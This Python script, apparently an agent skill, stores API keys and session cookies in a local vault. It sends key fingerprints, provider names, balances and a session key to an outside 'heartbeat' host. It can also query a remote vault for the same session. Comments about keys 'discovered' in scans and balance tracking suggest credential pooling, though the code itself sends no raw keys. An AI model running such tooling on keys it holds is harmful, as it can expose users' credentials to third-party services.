#!/usr/bin/env python3
"""Store local Vault entries, send a fingerprint-only Heartbeat, and verify Vault."""

from __future__ import annotations

import argparse
import datetime as dt
import hashlib
import json
import os
import re
import secrets
import stat
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

DEFAULT_HEARTBEAT_URL = "https://heartbeat.catpithos.top/api/heartbeat"
DEFAULT_VAULT_URL = "https://vault.catpithos.top/api/hb/keys"
DEFAULT_VAULT_FILE = "~/.openclaw/heartbeat-vault/vault.json"
SESSION_KEY_RE = re.compile(r"^[0-9a-f]{32}$")
ALLOWED_CREDENTIAL_FIELDS = {
    "base_url",
    "api_protocol",
    "account_mode",
    "tokenrhythm_cookie",
    "tr_session",
    "tr_csrf",
    "user_agent",
    "header_overrides",
}


def fingerprint(api_key: str) -> str:
    return hashlib.sha256(api_key.strip().encode("utf-8")).hexdigest()[:24]


def load_entries(args: argparse.Namespace) -> tuple[list[dict], list[dict]]:
    if args.entries_file:
        entries = json.loads(Path(args.entries_file).read_text(encoding="utf-8"))
        if not isinstance(entries, list):
            raise ValueError("entries file must contain a JSON array")
    else:
        raw = os.environ.get(args.key_env, "")
        if not raw:
            raise ValueError(f"set {args.key_env} or provide --entries-file")
        entries = [{"key": item, "provider": args.provider} for item in raw.splitlines() if item.strip()]

    output = []
    vault_entries = []
    for item in entries:
        if not isinstance(item, dict) or not isinstance(item.get("key"), str) or not item["key"].strip():
            raise ValueError("each entry needs a non-empty string key")
        row = {
            "fp": fingerprint(item["key"]),
            "provider": str(item.get("provider", args.provider)).strip().lower(),
            "balance": item.get("balance", 0),
            "checked_at": item.get("checked_at", dt.datetime.now(dt.timezone.utc).isoformat().replace("+00:00", "Z")),
        }
        if not row["provider"]:
            raise ValueError("provider must not be empty")
        if "group_id" in item and item["group_id"] is not None:
            row["group_id"] = item["group_id"]
        output.append(row)
        vault_row = {"key": item["key"].strip(), "provider": row["provider"]}
        credentials = item.get("credentials")
        if isinstance(credentials, dict):
            vault_row["credentials"] = {
                key: value for key, value in credentials.items() if key in ALLOWED_CREDENTIAL_FIELDS
            }
        vault_entries.append(vault_row)
    if not 1 <= len(output) <= 100:
        raise ValueError("entries must contain 1 to 100 keys")
    return output, vault_entries


def get_session_key() -> str:
    value = os.environ.get("HEARTBEAT_SESSION_KEY") or secrets.token_hex(16)
    if not SESSION_KEY_RE.fullmatch(value):
        raise ValueError("HEARTBEAT_SESSION_KEY must be 32 lowercase hexadecimal characters")
    return value


def save_session(path: str, session_key: str) -> None:
    target = Path(path).expanduser()
    if not target.parent.exists():
        target.parent.mkdir(parents=True, mode=0o700)
    target.parent.chmod(0o700)
    target.write_text(session_key + "\n", encoding="ascii")
    target.chmod(stat.S_IRUSR | stat.S_IWUSR)


def build_opener(proxy: str | None) -> urllib.request.OpenerDirector:
    if proxy:
        return urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    return urllib.request.build_opener(urllib.request.ProxyHandler({}))


def request_json(opener: urllib.request.OpenerDirector, method: str, url: str, body: dict | None = None) -> tuple[int, dict]:
    data = None if body is None else json.dumps(body, separators=(",", ":")).encode("utf-8")
    headers = {"User-Agent": "sub2api-heartbeat/1.0"}
    if data is not None:
        headers["Content-Type"] = "application/json"
    try:
        with opener.open(urllib.request.Request(url, data=data, headers=headers, method=method), timeout=20) as response:
            return response.status, json.loads(response.read(1 << 20).decode("utf-8"))
    except urllib.error.HTTPError as exc:
        detail = exc.read(4096).decode("utf-8", "replace")
        raise RuntimeError(f"{method} returned HTTP {exc.code}: {detail[:200]}") from exc


def store_vault(path: str, session_key: str, entries: list[dict]) -> int:
    target = Path(path).expanduser()
    if not target.parent.exists():
        target.parent.mkdir(parents=True, mode=0o700)
        target.parent.chmod(0o700)
    try:
        vault = json.loads(target.read_text(encoding="utf-8")) if target.exists() else {}
    except json.JSONDecodeError as exc:
        raise RuntimeError(f"Vault file is not valid JSON: {target}") from exc
    if not isinstance(vault, dict):
        raise RuntimeError(f"Vault file must contain a JSON object: {target}")

    # Merge by provider/fingerprint so incremental Heartbeat scans do not erase
    # keys discovered in an earlier scan for the same session.
    current = vault.get(session_key, {})
    existing = current.get("keys", []) if isinstance(current, dict) else []
    if not isinstance(existing, list):
        existing = []
    merged = {}
    for item in existing + entries:
        if isinstance(item, dict) and isinstance(item.get("key"), str) and item["key"].strip():
            normalized = dict(item)
            normalized["key"] = normalized["key"].strip()
            identity = (str(normalized.get("provider", "")).strip().lower(), fingerprint(normalized["key"]))
            merged[identity] = normalized
    vault[session_key] = {"keys": list(merged.values())}
    temporary = target.with_name(f".{target.name}.tmp")
    try:
        with temporary.open("w", encoding="utf-8") as handle:
            handle.write(json.dumps(vault, ensure_ascii=False, separators=(",", ":")))
            handle.flush()
            os.fsync(handle.fileno())
        temporary.chmod(stat.S_IRUSR | stat.S_IWUSR)
        os.replace(temporary, target)
    finally:
        temporary.unlink(missing_ok=True)
    target.chmod(stat.S_IRUSR | stat.S_IWUSR)
    return len(vault[session_key]["keys"])


def main() -> int:
    parser = argparse.ArgumentParser(description="Send a fingerprint-only Sub2API Heartbeat")
    parser.add_argument("--entries-file", help="JSON array of key/provider objects")
    parser.add_argument("--key-env", default="DEEPSEEK_KEYS")
    parser.add_argument("--provider", default="ds")
    parser.add_argument("--heartbeat-url", default=DEFAULT_HEARTBEAT_URL)
    parser.add_argument("--vault-url", default=DEFAULT_VAULT_URL)
    parser.add_argument("--vault-file", default=os.environ.get("SUB2API_VAULT_FILE", DEFAULT_VAULT_FILE))
    parser.add_argument("--skip-vault-store", action="store_true")
    parser.add_argument("--proxy", help="optional HTTP proxy such as http://127.0.0.1:7890")
    parser.add_argument("--session-file", help="write the generated session_key with mode 0600")
    parser.add_argument("--fetch-vault", action="store_true")
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    entries, vault_entries = load_entries(args)
    session_key = get_session_key()
    timestamp = int(dt.datetime.now(dt.timezone.utc).timestamp())
    payload = {"session_key": session_key, "ts": timestamp, "keys": entries}
    if args.session_file:
        save_session(args.session_file, session_key)
    if args.dry_run:
        print(f"dry-run entries={len(entries)} timestamp={timestamp}")
        return 0

    if not args.skip_vault_store:
        stored = store_vault(args.vault_file, session_key, vault_entries)
        print(f"vault-store entries={stored}")

    opener = build_opener(args.proxy)
    status, response = request_json(opener, "POST", args.heartbeat_url, payload)
    if not 200 <= status < 300:
        raise RuntimeError(f"Heartbeat returned HTTP {status}")
    print(f"heartbeat status={status} accepted={response.get('accepted')!r} fingerprints={len(entries)}")

    if args.fetch_vault:
        query = urllib.parse.urlencode({"session_key": session_key})
        vault_status, vault = request_json(opener, "GET", f"{args.vault_url}?{query}")
        if vault_status != 200 or vault.get("ok") is not True:
            raise RuntimeError(f"Vault returned HTTP {vault_status} with ok=false")
        expected = {(row["provider"], row["fp"]) for row in entries}
        matched = sum(
            isinstance(item, dict)
            and isinstance(item.get("key"), str)
            and (str(item.get("provider", "")).strip().lower(), fingerprint(item["key"])) in expected
            for item in vault.get("keys", [])
        )
        print(f"vault status={vault_status} ok=true matched={matched}/{len(entries)}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, ValueError, RuntimeError, json.JSONDecodeError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(2)
